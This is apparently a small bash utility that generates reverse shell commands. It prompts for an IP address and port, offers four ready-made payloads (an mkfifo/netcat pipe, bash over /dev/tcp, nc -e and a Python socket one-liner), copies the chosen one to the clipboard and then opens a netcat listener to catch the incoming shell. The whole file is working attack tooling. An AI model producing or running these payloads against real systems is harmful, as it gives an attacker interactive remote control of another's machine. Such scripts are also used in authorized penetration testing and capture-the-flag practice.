#!/bin/bash

#Definition of colours to make the display beautiful:)

boring="\e[0m" #no colour
red="\e[1;31m"
green="\e[1;32m"
blue="\e[1;34m"
hackergreen="\e[0;32m"
purple="\e[1;35m"

#Configuration of the reverse shell


echo -ne "${blue}Listening Port:${boring} " && read PORT

echo ""

echo -ne "${green}Those are your IP addresses:${purple}\n"

echo ""

hostname -I

echo ""

echo -ne "${blue}Choose your IP address from above:${boring} "  && read IP

echo ""


#PentestMonkey Reverse Shell Options


echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc or python):${boring} " && read reverse

rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"

nc="nc -e /bin/sh $IP $PORT"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"


#Display of the reverse shell


clear

echo ""

echo -ne "${green}This is your shell command line!!${boring}\n"

echo ""

if [ "$reverse" = "rm" ]; then
echo -ne $rm | xclip | echo -ne ${red}$rm${boring}
fi

if [ "$reverse" = "bash" ]; then
echo $bash | xclip | echo -ne ${red}$bash${boring}
fi

if [ "$reverse" = "nc" ]; then
echo $nc | xclip | echo -ne ${red}$nc${boring}
fi

if [ "$reverse" = "python" ]; then
echo $python | xclip | echo -ne ${red}$python${boring}
fi

echo ""
echo ""

echo -ne "${green}We have copied it for you!!! Paste it wherever you want:)${boring}\n"

echo ""

#Display of the listener (netcat)

echo -ne "${hackergreen}Waiting to say I'm in...${boring}"

echo ""
echo ""

nc -lvnp $PORT
